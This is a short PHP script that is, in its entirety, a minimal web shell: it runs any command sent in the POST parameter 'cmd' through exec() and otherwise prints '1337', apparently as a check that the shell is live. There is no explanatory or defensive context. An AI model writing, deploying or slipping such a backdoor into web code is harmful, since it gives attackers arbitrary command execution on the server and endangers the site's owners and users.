<?php 
if(isset($_POST["cmd"])){
    exec($_POST["cmd"]);
} else {
    echo "1337";
}
